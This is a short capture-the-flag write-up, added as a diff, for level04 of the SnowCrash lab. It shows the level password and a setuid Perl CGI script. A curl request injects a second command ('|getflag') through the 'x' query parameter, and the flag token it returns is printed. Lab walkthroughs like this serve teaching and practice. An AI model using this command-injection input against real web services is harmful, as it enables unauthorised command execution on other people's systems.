@@ -1,0 +1,21 @@
+su level04
+pass : qi0maab88jeaj46qoumi7maus
+
+level04@SnowCrash:~$ ls -la
+total 16
+dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
+-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
+-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
+-r-x------  1 level04 level04  675 Apr  3  2012 .profile
+
+level04.pl is a perl script, port 4747 (cf level04.pl file)
+La ligne "x(param("x"));" appelle la fonction "x" avec le paramètre "x" de la requête HTTP, récupéré à 
+l'aide de la fonction "param". Cela signifie que si un utilisateur envoie une requête HTTP avec un paramètre
+"x", le script exécutera la commande "echo" avec le paramètre "x" et renverra le résultat sous forme de
+document HTML. (thx chatGPT)
+
+level04@SnowCrash:~$ curl http://localhost:4747/level04.pl?x='|getflag'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
